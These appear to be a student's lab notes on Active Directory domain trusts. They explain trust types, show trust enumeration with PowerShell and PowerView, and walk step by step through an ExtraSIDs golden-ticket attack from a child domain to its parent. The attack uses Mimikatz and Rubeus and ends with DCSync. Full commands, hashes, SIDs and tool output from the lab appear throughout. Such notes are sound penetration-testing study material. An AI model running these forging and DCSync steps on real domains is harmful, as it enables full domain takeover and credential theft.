Trusts between domains can be transitive or non-transitive
#### Key terms

- **Forest**: The highest-level container in Active Directory that groups multiple domains under a single security boundary. It enables trust relationships, shared policies, and authentication across all domains within it.
- **Parent-Child Trust**: A two-way trust between a parent domain and its child. Users in **child.corp.local** can access resources in **corp.local**, and vice versa.
- **Cross-Link Trust**: A direct trust between two child domains to speed up authentication.
- **External Trust**: A one-way or two-way trust between domains in different forests, not connected by a forest trust. It uses **SID filtering** for security.
- **Tree-Root Trust**: A two-way trust between the **forest root domain** and a **new tree root domain** in the same forest.
- **Forest Trust**: A two-way trust between **two separate forest root domains**.
- **ESAE (Bastion Forest)**: A highly secure forest used for managing Active Directory.

Example with a **Child Domain**:

- **Parent**: **corp.local**
- **Child**: **child.corp.local**
- Users in **child.corp.local** can authenticate in **corp.local**, and vice versa.

Since a child domain is part of the same **Active Directory forest**, the trust is **always bidirectional** by design—you don't need to manually configure it as a separate trust.

However, **permissions still matter**! Just because trust exists doesn’t mean users automatically get access. You still need to assign proper **permissions** on resources.
#### Trust establishment

- A `transitive` trust means that trust is extended to objects that the child domain trusts. For example, let's say we have three domains. In a transitive relationship, if `Domain A` has a trust with `Domain B`, and `Domain B` has a `transitive` trust with `Domain C`, then `Domain A` will automatically trust `Domain C`.
- In a `non-transitive trust`, the child domain itself is the only one trusted.

![[Pasted image 20250206182449.png]]

Trusts can be set up in two directions: one-way or two-way (bidirectional).

- `One-way trust`: Users in a `trusted` domain can access resources in a trusting domain, not vice-versa.
- `Bidirectional trust`: Users from both trusting domains can access resources in the other domain. 
#### Enumeration

#### Get-ADTrust

```bash
PS C:\tools> Import-Module activedirectory
PS C:\tools> Get-ADTrust -Filter *

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : False
IntraForest             : True
IsTreeParent            : False
IsTreeRoot              : False
Name                    : LOGISTICS.INLANEFREIGHT.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : f48a1169-2e58-42c1-ba32-a6ccb10057ec
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : LOGISTICS.INLANEFREIGHT.LOCAL
TGTDelegation           : False
TrustAttributes         : 32
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False
```
#### Powerview

```bash
PS C:\tools> Import-Module .\PowerView.ps1
PS C:\tools> Get-DomainTrust


SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 3/29/2022 5:14:31 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:09 PM
WhenChanged     : 3/29/2022 4:48:04 PM
```

or

```bash
PS C:\tools> Get-DomainTrustMapping


SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 3/29/2022 5:14:31 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:09 PM
WhenChanged     : 3/29/2022 4:48:04 PM
```

#### Find Users in a Child Domain (Windows)

```bash
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
```

#### Domain Trusts - Child -> Parent Trusts

A **Golden Ticket Attack** occurs when an attacker compromises the **KRBTGT** account in an Active Directory (AD) domain, allowing them to forge **Kerberos Ticket-Granting Tickets (TGTs)** and gain persistent access.

The **ExtraSIDs Attack** extends this by adding extra **Security Identifiers (SIDs)** to a forged ticket, allowing attackers to escalate privileges or gain access to resources in other domains/forests.
#### ExtraSIDs Attack

**(LOGISTICS.INLANEFREIGHT.LOCAL --> INLANEFREIGHT.LOCAL)**

To perform this attack after compromising a child domain, we need the following:

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.
- With this data collected, the attack can be performed with Mimikatz.

The KRBTGT hash for the child domain:

```bash
lsadump::dcsync /user:LOGISTICS\krbtgt

Hash NTLM: 9d765b482771505cbe97411065964d5f
```

The SID for the child domain:

```bash
Import-Module .\PowerView.ps1
Get-DomainSID

S-1-5-21-2806153819-209893948-922872689
```

The name of a target user in the child domain (does not need to exist!):  `hacker`

The SID of the Enterprise Admins group of the root domain:

```bash
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
```

With this information, we can now generate a `Golden Ticket`. In Mimikatz:

```bash
kerberos::golden /user:hacker /domain:<Our_current_child_domain> /sid:<sid_of_child_domain> /krbtgt:<krbtgt_NTLM_hash> /sids:<sid_of_enterprise_admins_group> /ptt
```

Using our example:

```bash
.\mimikatz.exe
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
User      : hacker
Domain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
SID       : S-1-5-21-2806153819-209893948-922872689
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3842939050-3880317879-2865463114-519 ;
ServiceKey: 9d765b482771505cbe97411065964d5f - rc4_hmac_nt
Lifetime  : 3/28/2022 7:59:50 PM ; 3/25/2032 7:59:50 PM ; 3/25/2032 7:59:50 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitted for current session
```

Verify:

```bash
mimikatz # exit
Bye!
PS C:\Tools\mimikatz\x64> klist

Current LogonId is 0:0xd1aca

Cached Tickets: (1)

#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 2/6/2025 11:04:55 (local)
        End Time:   2/4/2035 11:04:55 (local)
        Renew Time: 2/4/2035 11:04:55 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

Now can access the DC of the parent domain:

```bash
PS C:\tools> ls \\academy-ea-dc01.inlanefreight.local\c$
 Volume in drive \\academy-ea-dc01.inlanefreight.local\c$ has no label.
 Volume Serial Number is B8B3-0D72

 Directory of \\academy-ea-dc01.inlanefreight.local\c$

09/15/2018  12:19 AM    <DIR>          PerfLogs
10/06/2021  01:50 PM    <DIR>          Program Files
09/15/2018  02:06 AM    <DIR>          Program Files (x86)
11/19/2021  12:17 PM    <DIR>          Shares
10/06/2021  10:31 AM    <DIR>          Users
03/21/2022  12:18 PM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)  18,080,178,176 bytes free
```

This can also be done using `Rubeus`

```bash
.\Rubeus.exe golden /rc4:<krbtgt_NTLM_hash> /domain:<Our_current_child_domain> /sid:<sid_of_child_domain> /sids:<sid_of_enterprise_admins_group> /user:hacker /ptt
```

Example:

```bash
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2 

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
[*] SID            : S-1-5-21-2806153819-209893948-922872689
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ExtraSIDs      : S-1-5-21-3842939050-3880317879-2865463114-519
[*] ServiceKey     : 9D765B482771505CBE97411065964D5F
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 9D765B482771505CBE97411065964D5F
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : LOGISTICS.INLANEFREIGHT.LOCAL

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'hacker@LOGISTICS.INLANEFREIGHT.LOCAL'

[*] AuthTime       : 3/29/2022 10:06:41 AM
[*] StartTime      : 3/29/2022 10:06:41 AM
[*] EndTime        : 3/29/2022 8:06:41 PM
[*] RenewTill      : 4/5/2022 10:06:41 AM

[*] base64(ticket.kirbi):
      doIF0zCCBc+gAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoR8bHUxPR0lTVElDUy5JTkxBTkVG
      UkVJR0hULkxPQ0FMojIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5M
      T0NBTKOCBDIwggQuoAMCARehAwIBA6KCBCAEggQc0u5onpWKAP0Hw0KJuEOAFp8OgfBXlkwH3sXu5BhH
      T3zO/Ykw2Hkq2wsoODrBj0VfvxDNNpvysToaQdjHIqIqVQ9kXfNHM7bsQezS7L1KSx++2iX94uRrwa/S
<--SNIP-->

[+] Ticket successfully imported!
```

Confirm with `klist`.

We can then perform a DCSync attack:

```bash
.\mimikatz.exe
lsadump::dcsync /user:INLANEFREIGHT\lab_adm
```

or:

```
.\mimikatz.exe
lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

